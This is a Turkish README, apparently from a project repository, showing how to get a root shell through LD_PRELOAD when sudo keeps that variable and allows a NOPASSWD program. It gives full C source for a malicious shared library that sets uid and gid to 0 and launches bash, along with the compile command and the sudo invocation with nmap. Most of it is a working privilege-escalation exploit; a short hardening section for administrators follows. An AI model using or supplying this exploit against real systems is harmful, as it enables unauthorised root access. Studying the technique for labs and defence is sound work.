# 📌 LD_PRELOAD ile Root Yetkili Shell Elde Etme

Bu proje, `LD_PRELOAD` ortam değişkeni kullanılarak belirli `sudo` yetkilerine sahip bir kullanıcı üzerinden root yetkili bir kabuk (shell) elde etmenin nasıl mümkün olduğunu gösterir.

## 📚 Açıklama

Eğer `sudo` yapılandırmasında `LD_PRELOAD` ortam değişkenine izin veriliyorsa (örneğin: `env_keep+=LD_PRELOAD`) ve kullanıcıya bazı programları `root` olarak `NOPASSWD` seçeneğiyle çalıştırma yetkisi tanınmışsa, özel yazılmış bir `.so` kütüphanesi ile root shell açmak mümkündür.

Örnek `sudo -l` çıktısı:

```bash
Varsayılanlar bu sistemde user için şöyle ayarlanmış:
    env_reset, env_keep+=LD_PRELOAD

Kullanıcı user bu sistemde şu komutları çalıştırabilir:
    (root) NOPASSWD: /usr/bin/nmap
     ...
     ...
```

## 🛠️ Kurulum ve Kullanım

### 1. C Kütüphanesini Yazın

`library.c` adında bir dosya oluşturun ve aşağıdaki kodu ekleyin:

```bash
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");  
    setgid(0);               
    setuid(0);               
    system("/bin/bash");     
}
```

### 2. Derleyin

Dosyayı `.so` (paylaşımlı kütüphane) formatında derlemek için şu komutu çalıştırın:

```bash
gcc -fPIC -shared -o /tmp/library.so library.c -nostartfiles
```

### 3. Root Yetkili Shell Açın

Root olarak çalıştırmanıza izin verilen bir programı `LD_PRELOAD` ile şu şekilde başlatın:

```bash
sudo LD_PRELOAD=/tmp/library.so /usr/bin/nmap
```

Eğer başarılıysa, `#` işaretiyle başlayan bir root shell açılmış olacaktır.

## 🔒 Güvenlik Önerileri

Sistem yöneticileri için:

- `sudoers` dosyasında `env_keep+=LD_PRELOAD` ifadesinden kaçınılmalıdır.
- `NOPASSWD` sadece gerçekten gerekli komutlarla sınırlandırılmalıdır.
- Her zaman "en az ayrıcalık" prensibi uygulanmalıdır.
